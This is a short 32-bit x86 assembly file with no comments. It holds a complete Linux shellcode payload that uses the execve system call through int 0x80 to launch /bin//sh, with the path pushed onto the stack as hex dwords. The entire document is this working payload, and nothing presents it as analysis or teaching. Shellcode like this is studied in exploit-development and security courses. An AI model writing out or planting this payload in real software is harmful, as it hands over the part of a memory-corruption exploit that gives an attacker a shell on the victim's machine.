BITS 32 
    xor eax,eax
    mov BYTE al,0x0b
    cdq
    push edx
    push   0x68732f2f
    push   0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    int 0x80
